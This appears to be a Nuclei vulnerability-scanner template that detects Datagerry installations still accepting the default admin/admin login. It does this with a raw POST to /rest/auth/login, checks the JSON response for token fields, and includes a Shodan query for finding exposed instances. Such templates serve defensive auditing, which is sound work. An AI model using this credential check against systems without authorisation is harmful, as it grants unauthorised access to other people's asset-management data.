id: datagerry-default-login
info:
  name: Datagerry - Default Login
  author: gy741
  severity: high
  description: |
    Datagerry was using default username and password was discovered.
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)datagerry"})
    max-request: 1
    shodan-query: http.title:"datagerry"
    verified: true
  tags: datagerry,default-login,vuln
variables:
  password: admin
  username: admin
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - '"token":'
          - '"token_issued_at":'
          - '"token_expire":'
      - part: content_type
        type: word
        words:
          - application/json
      - status:
          - 200
        type: status
    matchers-condition: and
    raw:
      - |
        POST /rest/auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"user_name":"{{username}}","password":"{{password}}"}
